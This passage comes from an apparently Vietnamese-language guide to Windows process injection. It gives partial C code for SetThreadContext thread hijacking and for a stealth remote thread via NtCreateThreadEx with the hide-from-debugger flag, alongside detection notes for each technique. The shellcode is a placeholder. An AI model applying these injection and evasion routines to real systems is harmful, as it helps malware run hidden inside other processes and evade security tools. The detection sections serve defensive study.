...
### 8.8 Thread Hijacking — SetContextThread (Working Code)

**Concept:** Suspend một thread trong target process, redirect RIP đến shellcode đã write vào process đó, rồi resume. Không tạo thread mới → `PsSetCreateThreadNotifyRoutine` không fire.

```c
#include <windows.h>
#include <stdio.h>

// shellcode placeholder — thay bằng payload thực (e.g. calc.exe pop = \xfc\x48\x83...)
unsigned char shellcode[] = { 0x90, 0x90, 0xCC }; // NOP, NOP, INT3 (debug placeholder)

BOOL HijackThread(DWORD pid, DWORD threadID) {
    // 1. Mở handle đến target process để allocate + write memory
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProc) { printf("OpenProcess failed: %lu\n", GetLastError()); return FALSE; }

    // 2. Allocate executable memory trong target process
    PVOID remoteShellcode = VirtualAllocEx(hProc, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 3. Write shellcode vào target
    WriteProcessMemory(hProc, remoteShellcode, shellcode, sizeof(shellcode), NULL);

    // 4. Mở handle đến target thread
    ...
    // 6. Lấy register context hiện tại
    CONTEXT ctx = { 0 };
    ...
    // 7. Redirect RIP → shellcode
    //    Lưu ý: shellcode phải tự handle việc restore RIP cũ nếu muốn thread tiếp tục
    ctx.Rip = (DWORD64)remoteShellcode;

    // 8. Set context mới
    SetThreadContext(hThread, &ctx);

    // 9. Resume — thread executes từ shellcode
    ResumeThread(hThread);
...
**Yêu cầu:** `THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME` — thường cần admin hoặc `SeDebugPrivilege` để mở handle đến thread của process khác.

**Lưu ý quan trọng:** Shellcode phải tự save/restore original RIP nếu muốn thread tiếp tục chạy bình thường sau khi shellcode xong. Nếu không, thread crash sau khi shellcode return.

**Detection:**
- ETW-TI `KERNEL_THREATINT_TASK_SETTHREADCONTEXT`: fires khi `NtSetContextThread` called với new RIP — captures target TID, caller, new context
- `ObRegisterCallbacks`: cross-process thread handle open với `THREAD_SET_CONTEXT` access mask — observable ngay khi `OpenThread` called
- Sysmon Event 10 (ProcessAccess) nếu cấu hình capture thread access
- Memory forensics: thread RIP trỏ vào private anonymous memory (không có backing module) = strong indicator

---

### 8.9 NtCreateThreadEx — Stealth Remote Thread Creation

**Concept:** `NtCreateThreadEx` (Native API trực tiếp) cho phép set flags mà `CreateRemoteThread` (Win32) không expose, đặc biệt `THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER`.
...
typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
    ...
    IN  PVOID               ObjectAttributes,   // NULL
    IN  HANDLE              ProcessHandle,
    IN  PVOID               StartRoutine,        // thread start address (shellcode)
    IN  PVOID               Argument,            // parameter passed to routine
    IN  ULONG               CreateFlags,
    IN  SIZE_T              ZeroBits,
    IN  SIZE_T              StackSize,
    IN  SIZE_T              MaximumStackSize,
    IN  PVOID               AttributeList);      // NULL

// CreateFlags:
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED    0x00000001
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER  0x00000004

HANDLE CreateStealthRemoteThread(HANDLE hProcess, PVOID startAddr, PVOID arg) {
    // Resolve từ ntdll trực tiếp — không qua CreateRemoteThread
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtCreateThreadEx_t pNtCreateThreadEx =
        (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");
    if (!pNtCreateThreadEx) return NULL;
    ...
    NTSTATUS status = pNtCreateThreadEx(
        ...
        startAddr,
        arg,
        THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,  // ẩn với user-mode debugger
        0, 0, 0,
        NULL);
...
**Tại sao `HIDE_FROM_DEBUGGER` flag quan trọng:**
- Thread bị ẩn khỏi `DebugActiveProcess` enumeration và tool như OllyDbg, x64dbg (user-mode debugger)
- **Không ẩn với kernel-level:** `PsSetCreateThreadNotifyRoutine` vẫn fires cho thread này
- Một số user-mode EDR sensors (hook `CreateRemoteThread` ở Win32 level) miss nó nếu không hook `NtCreateThreadEx` trực tiếp

**Detection:**
- `PsSetCreateThreadNotifyRoutine` (kernel callback): fires bất kể flags — đây là telemetry source tin cậy nhất
- `ObRegisterCallbacks`: cross-process PROCESS_CREATE_THREAD handle open → observable
- Sysmon Event 8 (CreateRemoteThread): Sysmon hook ở mức đủ thấp để catch NtCreateThreadEx
- So sánh thread list từ user-mode tool vs kernel `!process` trong WinDbg → missing threads = hidden from debugger
